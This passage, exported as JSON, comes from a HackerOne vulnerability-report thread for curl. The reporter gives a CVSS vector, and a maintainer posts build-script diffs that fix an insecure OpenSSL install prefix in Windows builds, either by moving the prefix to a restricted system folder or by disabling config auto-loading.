0026amp;X-Amz-Signature=d18c495fe33128cf8a35754cc26bb1dfd184726a0a6e33946805a0f3cd915ddb\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T15:30:09.739Z","updated_at":"2019-06-12T15:30:09.739Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":507756,"filename":"windows-default-perms-cdrive.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/756/6b2f2f70ec13167c53593c6155b068b9e2394be1/windows-default-perms-cdrive.png?response-content-disposition=attachment%3B%20filename%3D%22windows-default-perms-cdrive.png%22%3B%20filename%2A%3DUTF-8%27%27windows-default-perms-cdrive.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063008Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=d18c495fe33128cf8a35754cc26bb1dfd184726a0a6e33946805a0f3cd915ddb"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5071128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the question of severity I used the CVSS 3.0 scale. It appears that H1 dropped the CVSS vector or at least I don't see it from the view I have of the ticket. Here is a link to the break down.\n\nVector CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n\nhttps://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n\n\n","markdown_message":"\u003cp\u003eFor the question of severity I used the CVSS 3.0 scale. It appears that H1 dropped the CVSS vector or at least I don\u0026#39;t see it from the view I have of the ticket. Here is a link to the break down.\u003c/p\u003e\n\n\u003cp\u003eVector CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\" href=\"/redirect?url=https%3A%2F%2Fwww.first.org%2Fcvss%2Fcalculator%2F3.0%23CVSS%3A3.0%2FAV%3AL%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T15:37:52.224Z","updated_at":"2019-06-12T15:37:52.224Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5071139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It seems it's currently not possible to build OpenSSL binaries for Windows via mingw/mingw64 that don't have this vulnerability. It turns out that OpenSSL's `./Configure` does not recognize a Windows absolute path `--prefix` as an absolute one and aborts with `Directory given with --prefix MUST be absolute`. Windows-specific prefix auto-detection also doesn't work because mingw is regarded as a *nix-like target throughout the build configuration.\n\nWith a minimal local OpenSSL patch, I could let it continue instead of aborting. Not the ultimate beatiful solution.\n\nThis, and the curl option typo fix here:\n```\ndiff --git a/curl.sh b/curl.sh\nindex ac8d6bd..a59d1a8 100755\n--- a/curl.sh\n+++ b/curl.sh\n@@ -1,6 +1,6 @@\n #!/bin/sh -ex\n \n-# Copyright 2014-2018 Viktor Szakats \u003chttps://vszakats.net/\u003e\n+# Copyright 2014-2019 Viktor Szakats \u003chttps://vszakats.net/\u003e\n # See LICENSE.md\n \n export _NAM\n@@ -49,7 +49,7 @@ _cpu=\"$2\"\n   # public libcurl functions being marked as 'exported'. It's useful to\n   # avoid the chance of libcurl functions getting exported from final\n   # binaries when linked against static libcurl lib.\n-  export CURL_CFLAG_EXTRAS='-DCURL_STATICLIB -fno-ident -DCURL_DISABLE_SSL_AUTO_LOAD_CONFIG'\n+  export CURL_CFLAG_EXTRAS='-DCURL_STATICLIB -fno-ident'\n   [ \"${_cpu}\" = '32' ] \u0026\u0026 CURL_CFLAG_EXTRAS=\"${CURL_CFLAG_EXTRAS} -fno-asynchronous-unwind-tables\"\n   export CURL_LDFLAG_EXTRAS='-static-libgcc -Wl,--nxcompat -Wl,--dynamicbase'\n   export CURL_LDFLAG_EXTRAS_EXE\n@@ -91,6 +91,7 @@ _cpu=\"$2\"\n \n   [ -d ../openssl ] \u0026\u0026 export OPENSSL_PATH=../../openssl\n   if [ -n \"${OPENSSL_PATH}\" ]; then\n+    CURL_CFLAG_EXTRAS=\"${CURL_CFLAG_EXTRAS} -DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\"\n     options=\"${options}-ssl\"\n     export OPENSSL_INCLUDE=\"${OPENSSL_PATH}/include\"\n     export OPENSSL_LIBPATH=\"${OPENSSL_PATH}\"\ndiff --git a/openssl.sh b/openssl.sh\nindex 6e2c01b..a952a78 100755\n--- a/openssl.sh\n+++ b/openssl.sh\n@@ -1,6 +1,6 @@\n #!/bin/sh -ex\n \n-# Copyright 2014-2018 Viktor Szakats \u003chttps://vszakats.net/\u003e\n+# Copyright 2014-2019 Viktor Szakats \u003chttps://vszakats.net/\u003e\n # See LICENSE.md\n \n export _NAM\n@@ -62,16 +62,24 @@ _cpu=\"$2\"\n   # AR=, NM=, RANLIB=\n   unset CC\n \n+  pfx=''\n+  [ \"${_cpu}\" = '64' ] \u0026\u0026 pfx='--prefix=C:\\Program Files\\Common Files\\SSL'\n+  [ \"${_cpu}\" = '32' ] \u0026\u0026 pfx='--prefix=C:\\Program Files (x86)\\Common Files\\SSL'\n+\n+  # Patch `Configure` to not abort when it misdetects a Windows absolute path\n+  # as a relative one.\n+  sed 's|die \"Directory given with --prefix|print \"Directory given with --prefix|g' \u003c ./Configure \u003e ./Configure-patched\n+  chmod +x ./Configure-patched\n+\n   # shellcheck disable=SC2086\n-  ./Configure ${options} shared \\\n+  ./Configure-patched ${options} \"${pfx}\" shared \\\n     \"--cross-compile-prefix=${_CCPREFIX}\" \\\n     -fno-ident \\\n     -Wl,--nxcompat -Wl,--dynamicbase \\\n     no-unit-test \\\n     no-idea \\\n     no-tests \\\n-    no-makedepend \\\n-    '--prefix=/usr/local'\n+    no-makedepend\n   SOURCE_DATE_EPOCH=${unixts} TZ=UTC make\n   # Install it so that it can be detected by CMake\n   make install \"DESTDIR=$(pwd)/pkg\" \u003e /dev/null # 2\u003e\u00261\n```\n","markdown_message":"\u003cp\u003eIt seems it\u0026#39;s currently not possible to build OpenSSL binaries for Windows via mingw/mingw64 that don\u0026#39;t have this vulnerability. It turns out that OpenSSL\u0026#39;s \u003ccode\u003e./Configure\u003c/code\u003e does not recognize a Windows absolute path \u003ccode\u003e--prefix\u003c/code\u003e as an absolute one and aborts with \u003ccode\u003eDirectory given with --prefix MUST be absolute\u003c/code\u003e. Windows-specific prefix auto-detection also doesn\u0026#39;t work because mingw is regarded as a *nix-like target throughout the build configuration.\u003c/p\u003e\n\n\u003cp\u003eWith a minimal local OpenSSL patch, I could let it continue instead of aborting. Not the ultimate beatiful solution.\u003c/p\u003e\n\n\u003cp\u003eThis, and the curl option typo fix here:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/curl.sh b/curl.sh\nindex ac8d6bd..a59d1a8 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/curl.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/curl.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n #!/bin/sh -ex\n\n-# Copyright 2014-2018 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003cspan class=\"gi\"\u003e+# Copyright 2014-2019 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003c/span\u003e # See LICENSE.md\n\n export _NAM\n\u003cspan class=\"p\"\u003e@@ -49,7 +49,7 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n   # public libcurl functions being marked as \u0026#39;exported\u0026#39;. It\u0026#39;s useful to\n   # avoid the chance of libcurl functions getting exported from final\n   # binaries when linked against static libcurl lib.\n\u003cspan class=\"gd\"\u003e-  export CURL_CFLAG_EXTRAS=\u0026#39;-DCURL_STATICLIB -fno-ident -DCURL_DISABLE_SSL_AUTO_LOAD_CONFIG\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  export CURL_CFLAG_EXTRAS=\u0026#39;-DCURL_STATICLIB -fno-ident\u0026#39;\n\u003c/span\u003e   [ \u0026quot;${_cpu}\u0026quot; = \u0026#39;32\u0026#39; ] \u0026amp;\u0026amp; CURL_CFLAG_EXTRAS=\u0026quot;${CURL_CFLAG_EXTRAS} -fno-asynchronous-unwind-tables\u0026quot;\n   export CURL_LDFLAG_EXTRAS=\u0026#39;-static-libgcc -Wl,--nxcompat -Wl,--dynamicbase\u0026#39;\n   export CURL_LDFLAG_EXTRAS_EXE\n\u003cspan class=\"p\"\u003e@@ -91,6 +91,7 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n\n   [ -d ../openssl ] \u0026amp;\u0026amp; export OPENSSL_PATH=../../openssl\n   if [ -n \u0026quot;${OPENSSL_PATH}\u0026quot; ]; then\n\u003cspan class=\"gi\"\u003e+    CURL_CFLAG_EXTRAS=\u0026quot;${CURL_CFLAG_EXTRAS} -DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\u0026quot;\n\u003c/span\u003e     options=\u0026quot;${options}-ssl\u0026quot;\n     export OPENSSL_INCLUDE=\u0026quot;${OPENSSL_PATH}/include\u0026quot;\n     export OPENSSL_LIBPATH=\u0026quot;${OPENSSL_PATH}\u0026quot;\n\u003cspan class=\"gh\"\u003ediff --git a/openssl.sh b/openssl.sh\nindex 6e2c01b..a952a78 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/openssl.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/openssl.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n #!/bin/sh -ex\n\n-# Copyright 2014-2018 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003cspan class=\"gi\"\u003e+# Copyright 2014-2019 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003c/span\u003e # See LICENSE.md\n\n export _NAM\n\u003cspan class=\"p\"\u003e@@ -62,16 +62,24 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n   # AR=, NM=, RANLIB=\n   unset CC\n\n+  pfx=\u0026#39;\u0026#39;\n\u003cspan class=\"gi\"\u003e+  [ \u0026quot;${_cpu}\u0026quot; = \u0026#39;64\u0026#39; ] \u0026amp;\u0026amp; pfx=\u0026#39;--prefix=C:\\Program Files\\Common Files\\SSL\u0026#39;\n+  [ \u0026quot;${_cpu}\u0026quot; = \u0026#39;32\u0026#39; ] \u0026amp;\u0026amp; pfx=\u0026#39;--prefix=C:\\Program Files (x86)\\Common Files\\SSL\u0026#39;\n+\n+  # Patch `Configure` to not abort when it misdetects a Windows absolute path\n+  # as a relative one.\n+  sed \u0026#39;s|die \u0026quot;Directory given with --prefix|print \u0026quot;Directory given with --prefix|g\u0026#39; \u0026lt; ./Configure \u0026gt; ./Configure-patched\n+  chmod +x ./Configure-patched\n+\n\u003c/span\u003e   # shellcheck disable=SC2086\n\u003cspan class=\"gd\"\u003e-  ./Configure ${options} shared \\\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  ./Configure-patched ${options} \u0026quot;${pfx}\u0026quot; shared \\\n\u003c/span\u003e     \u0026quot;--cross-compile-prefix=${_CCPREFIX}\u0026quot; \\\n     -fno-ident \\\n     -Wl,--nxcompat -Wl,--dynamicbase \\\n     no-unit-test \\\n     no-idea \\\n     no-tests \\\n\u003cspan class=\"gd\"\u003e-    no-makedepend \\\n-    \u0026#39;--prefix=/usr/local\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    no-makedepend\n\u003c/span\u003e   SOURCE_DATE_EPOCH=${unixts} TZ=UTC make\n   # Install it so that it can be detected by CMake\n   make install \u0026quot;DESTDIR=$(pwd)/pkg\u0026quot; \u0026gt; /dev/null # 2\u0026gt;\u0026amp;1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-06-12T15:40:38.128Z","updated_at":"2019-06-12T15:40:38.128Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5071754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, no, the OpenSSL patch doesn't work. Switching to forward slashes will allow creating correct-looking binaries, but the build process also uses the prefix in its install phase, where it prepends current dir and tries to copy onto it without quoting the path. It fails obviously with Windows paths containing spaces and parenthesis.\n\nI'm shifting towards fixing this in curl by just disabling OpenSSL auto-load.\n\nIs it far fetched to say that the OpenSSL issue merits its own CVE and private report to OpenSSL maintainers?\n\nUPDATE: Or we can also disable the engine subsystem in OpenSSL at build-time.","markdown_message":"\u003cp\u003eWell, no, the OpenSSL patch doesn\u0026#39;t work. Switching to forward slashes will allow creating correct-looking binaries, but the build process also uses the prefix in its install phase, where it prepends current dir and tries to copy onto it without quoting the path. It fails obviously with Windows paths containing spaces and parenthesis.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m shifting towards fixing this in curl by just disabling OpenSSL auto-load.\u003c/p\u003e\n\n\u003cp\u003eIs it far fetched to say that the OpenSSL issue merits its own CVE and private report to OpenSSL maintainers?\u003c/p\u003e\n\n\u003cp\u003eUPDATE: Or we can also disable the engine subsystem in OpenSSL at build-time.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T16:15:53.544Z","updated_at":"2019-06-12T16:18:04.825Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5073778,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"After further experiments, I managed to tweak the build so that engine support can be kept enabled, and OpenSSL be built with a secure prefix. The trick was to use `C:/Windows/System32/OpenSSL`. This location can be fairly assumed to be a restricted directory on majority of installs and on all default installs going back a long time. It also works equally for 32-bit and 64-bit Windows editions. Since the path doesn't have spaces, it works with existing OpenSSL build code. Slight downside is that we're tampering with an OS-managed folder, but there has been worse things seen on Windows, and the directory doesn't need to be present to use OpenSSL/curl anyway. The small patch for `./Configure` is still required though.\n\nIn my tests I could reproduce the problem with the latest public build, but not anymore with the patched one (tested 64-bit). Please find attached the patched builds.\n\nLet me know what you think.\n\nUpdated patch:\n```\ndiff --git a/_dl.sh b/_dl.sh\nindex 9505a8c..7e59d5f 100755\n--- a/_dl.sh\n+++ b/_dl.sh\n@@ -28,7 +28,7 @@ export OSSLSIGNCODE_HASH=f9a8cdb38b9c309326764ebc937cba1523a3a751a7ab05df3ecc99d\n # NOTE: Set _REV to empty after bumping CURL_VER_, and\n #       set it to 1 then increment by 1 each time bumping a dependency\n #       version or pushing a CI rebuild for the master branch.\n-export _REV='1'\n+export _REV='2'\n \n [ -z \"${_REV}\" ] || _REV=\"_${_REV}\"\n \ndiff --git a/curl.sh b/curl.sh\nindex ac8d6bd..a59d1a8 100755\n--- a/curl.sh\n+++ b/curl.sh\n@@ -1,6 +1,6 @@\n #!/bin/sh -ex\n \n-# Copyright 2014-2018 Viktor Szakats \u003chttps://vszakats.net/\u003e\n+# Copyright 2014-2019 Viktor Szakats \u003chttps://vszakats.net/\u003e\n # See LICENSE.md\n \n export _NAM\n@@ -49,7 +49,7 @@ _cpu=\"$2\"\n   # public libcurl functions being marked as 'exported'. It's useful to\n   # avoid the chance of libcurl functions getting exported from final\n   # binaries when linked against static libcurl lib.\n-  export CURL_CFLAG_EXTRAS='-DCURL_STATICLIB -fno-ident -DCURL_DISABLE_SSL_AUTO_LOAD_CONFIG'\n+  export CURL_CFLAG_EXTRAS='-DCURL_STATICLIB -fno-ident'\n   [ \"${_cpu}\" = '32' ] \u0026\u0026 CURL_CFLAG_EXTRAS=\"${CURL_CFLAG_EXTRAS} -fno-asynchronous-unwind-tables\"\n   export CURL_LDFLAG_EXTRAS='-static-libgcc -Wl,--nxcompat -Wl,--dynamicbase'\n   export CURL_LDFLAG_EXTRAS_EXE\n@@ -91,6 +91,7 @@ _cpu=\"$2\"\n \n   [ -d ../openssl ] \u0026\u0026 export OPENSSL_PATH=../../openssl\n   if [ -n \"${OPENSSL_PATH}\" ]; then\n+    CURL_CFLAG_EXTRAS=\"${CURL_CFLAG_EXTRAS} -DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\"\n     options=\"${options}-ssl\"\n     export OPENSSL_INCLUDE=\"${OPENSSL_PATH}/include\"\n     export OPENSSL_LIBPATH=\"${OPENSSL_PATH}\"\ndiff --git a/libssh2_cmake.sh b/libssh2_cmake.sh\nindex ee38f77..7b5fcc3 100755\n--- a/libssh2_cmake.sh\n+++ b/libssh2_cmake.sh\n@@ -1,6 +1,6 @@\n #!/bin/sh -ex\n \n-# Copyright 2014-2018 Viktor Szakats \u003chttps://vszakats.net/\u003e\n+# Copyright 2014-2019 Viktor Szakats \u003chttps://vszakats.net/\u003e\n # See LICENSE.md\n \n export _NAM\n@@ -68,10 +68,10 @@ _cpu=\"$2\"\n     options=\"${options} -DZLIB_INCLUDE_DIR:PATH=$(pwd)/../zlib/pkg/usr/local/include\"\n     options=\"${options} -DZLIB_LIBRARY:FILEPATH=$(pwd)/../zlib/pkg/usr/local/lib/libz.a\"\n     options=\"${options} -DCRYPTO_BACKEND=OpenSSL\"\n-    options=\"${options} -DOPENSSL_ROOT_DIR=$(pwd)/../openssl/pkg/usr/local/\"\n-    options=\"${options} -DOPENSSL_INCLUDE_DIR=$(pwd)/../openssl/pkg/usr/local/include\"\n-    options=\"${options} -DOPENSSL_LIBRARIES=$(pwd)/../openssl/pkg/usr/local/lib\"\n-    options=\"${options} -DOPENSSL_CRYPTO_LIBRARY=$(pwd)/../openssl/pkg/usr/local/lib\"\n+    options=\"${options} -DOPENSSL_ROOT_DIR=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/\"\n+    options=\"${options} -DOPENSSL_INCLUDE_DIR=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/include\"\n+    options=\"${options} -DOPENSSL_LIBRARIES=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/lib\"\n+    options=\"${options} -DOPENSSL_CRYPTO_LIBRARY=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/lib\"\n     options=\"${options} -DCMAKE_RC_COMPILER=${_CCPREFIX}windres\"\n     options=\"${options} -DCMAKE_INSTALL_MESSAGE=NEVER\"\n     options=\"${options} -DCMAKE_INSTALL_PREFIX=/usr/local\"\ndiff --git a/openssl.sh b/openssl.sh\nindex 6e2c01b..a70e627 100755\n--- a/openssl.sh\n+++ b/openssl.sh\n@@ -1,6 +1,6 @@\n #!/bin/sh -ex\n \n-# Copyright 2014-2018 Viktor Szakats \u003chttps://vszakats.net/\u003e\n+# Copyright 2014-2019 Viktor Szakats \u003chttps://vszakats.net/\u003e\n # See LICENSE.md\n \n export _NAM\n@@ -62,8 +62,20 @@ _cpu=\"$2\"\n   # AR=, NM=, RANLIB=\n   unset CC\n \n+  # Patch OpenSSL ./Configure to not abort when seeing a Windows\n+  # absolute path passed as --prefix. Without the patch it\n+  # misidentifies all Windows absolute paths as relative ones.\n+  sed 's|die \"Directory given with --prefix|print \"Directory given with --prefix|g' \\\n+    \u003c ./Configure \u003e ./Configure-patched\n+  chmod +x ./Configure-patched\n+\n+  # Space or backslash not allowed. Needs to be a folder restricted\n+  # to Administrators across majority of Windows installations, versions\n+  # and configurations.\n+  _prefix='C:/Windows/System32/OpenSSL'\n+\n   # shellcheck disable=SC2086\n-  ./Configure ${options} shared \\\n+  ./Configure-patched ${options} shared \\\n     \"--cross-compile-prefix=${_CCPREFIX}\" \\\n     -fno-ident \\\n     -Wl,--nxcompat -Wl,--dynamicbase \\\n@@ -71,13 +83,14 @@ _cpu=\"$2\"\n     no-idea \\\n     no-tests \\\n     no-makedepend \\\n-    '--prefix=/usr/local'\n+    \"--prefix=${_prefix}\"\n   SOURCE_DATE_EPOCH=${unixts} TZ=UTC make\n   # Install it so that it can be detected by CMake\n-  make install \"DESTDIR=$(pwd)/pkg\" \u003e /dev/null # 2\u003e\u00261\n+  # (ending slash required)\n+  make install \"DESTDIR=$(pwd)/pkg/\" \u003e /dev/null # 2\u003e\u00261\n \n   # DESTDIR= + --prefix=\n-  _pkg='pkg/usr/local'\n+  _pkg=\"pkg/${_prefix}\"\n \n   # Make steps for determinism\n```\n","markdown_message":"\u003cp\u003eAfter further experiments, I managed to tweak the build so that engine support can be kept enabled, and OpenSSL be built with a secure prefix. The trick was to use \u003ccode\u003eC:/Windows/System32/OpenSSL\u003c/code\u003e. This location can be fairly assumed to be a restricted directory on majority of installs and on all default installs going back a long time. It also works equally for 32-bit and 64-bit Windows editions. Since the path doesn\u0026#39;t have spaces, it works with existing OpenSSL build code. Slight downside is that we\u0026#39;re tampering with an OS-managed folder, but there has been worse things seen on Windows, and the directory doesn\u0026#39;t need to be present to use OpenSSL/curl anyway. The small patch for \u003ccode\u003e./Configure\u003c/code\u003e is still required though.\u003c/p\u003e\n\n\u003cp\u003eIn my tests I could reproduce the problem with the latest public build, but not anymore with the patched one (tested 64-bit). Please find attached the patched builds.\u003c/p\u003e\n\n\u003cp\u003eLet me know what you think.\u003c/p\u003e\n\n\u003cp\u003eUpdated patch:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/_dl.sh b/_dl.sh\nindex 9505a8c..7e59d5f 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/_dl.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/_dl.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -28,7 +28,7 @@\u003c/span\u003e export OSSLSIGNCODE_HASH=f9a8cdb38b9c309326764ebc937cba1523a3a751a7ab05df3ecc99d\n # NOTE: Set _REV to empty after bumping CURL_VER_, and\n #       set it to 1 then increment by 1 each time bumping a dependency\n #       version or pushing a CI rebuild for the master branch.\n\u003cspan class=\"gd\"\u003e-export _REV=\u0026#39;1\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+export _REV=\u0026#39;2\u0026#39;\n\u003c/span\u003e\n [ -z \u0026quot;${_REV}\u0026quot; ] || _REV=\u0026quot;_${_REV}\u0026quot;\n\ndiff --git a/curl.sh b/curl.sh\n\u003cspan class=\"gh\"\u003eindex ac8d6bd..a59d1a8 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/curl.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/curl.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n #!/bin/sh -ex\n\n-# Copyright 2014-2018 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003cspan class=\"gi\"\u003e+# Copyright 2014-2019 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003c/span\u003e # See LICENSE.md\n\n export _NAM\n\u003cspan class=\"p\"\u003e@@ -49,7 +49,7 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n   # public libcurl functions being marked as \u0026#39;exported\u0026#39;. It\u0026#39;s useful to\n   # avoid the chance of libcurl functions getting exported from final\n   # binaries when linked against static libcurl lib.\n\u003cspan class=\"gd\"\u003e-  export CURL_CFLAG_EXTRAS=\u0026#39;-DCURL_STATICLIB -fno-ident -DCURL_DISABLE_SSL_AUTO_LOAD_CONFIG\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  export CURL_CFLAG_EXTRAS=\u0026#39;-DCURL_STATICLIB -fno-ident\u0026#39;\n\u003c/span\u003e   [ \u0026quot;${_cpu}\u0026quot; = \u0026#39;32\u0026#39; ] \u0026amp;\u0026amp; CURL_CFLAG_EXTRAS=\u0026quot;${CURL_CFLAG_EXTRAS} -fno-asynchronous-unwind-tables\u0026quot;\n   export CURL_LDFLAG_EXTRAS=\u0026#39;-static-libgcc -Wl,--nxcompat -Wl,--dynamicbase\u0026#39;\n   export CURL_LDFLAG_EXTRAS_EXE\n\u003cspan class=\"p\"\u003e@@ -91,6 +91,7 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n\n   [ -d ../openssl ] \u0026amp;\u0026amp; export OPENSSL_PATH=../../openssl\n   if [ -n \u0026quot;${OPENSSL_PATH}\u0026quot; ]; then\n\u003cspan class=\"gi\"\u003e+    CURL_CFLAG_EXTRAS=\u0026quot;${CURL_CFLAG_EXTRAS} -DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\u0026quot;\n\u003c/span\u003e     options=\u0026quot;${options}-ssl\u0026quot;\n     export OPENSSL_INCLUDE=\u0026quot;${OPENSSL_PATH}/include\u0026quot;\n     export OPENSSL_LIBPATH=\u0026quot;${OPENSSL_PATH}\u0026quot;\n\u003cspan class=\"gh\"\u003ediff --git a/libssh2_cmake.sh b/libssh2_cmake.sh\nindex ee38f77..7b5fcc3 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/libssh2_cmake.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/libssh2_cmake.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n #!/bin/sh -ex\n\n-# Copyright 2014-2018 Viktor Szakats 